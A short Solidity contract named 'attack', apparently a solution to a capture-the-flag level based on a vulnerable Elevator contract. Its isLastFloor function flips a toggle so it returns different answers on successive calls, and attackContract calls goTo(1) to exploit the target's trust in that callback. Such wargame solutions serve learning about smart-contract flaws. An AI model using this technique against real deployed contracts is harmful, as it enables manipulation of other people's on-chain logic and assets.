pragma solidity ^0.8.0;

contract attack{
    Elevator target;
    bool public toogle;
    constructor(address _deployedContractAddr){
        toogle = true;
        target = Elevator(_deployedContractAddr);
    }
    function isLastFloor(uint _floor) public returns(bool){
        toogle = !toogle;
        return toogle;
    }

    function attackContract() public{
        target.goTo(1);
    }
}
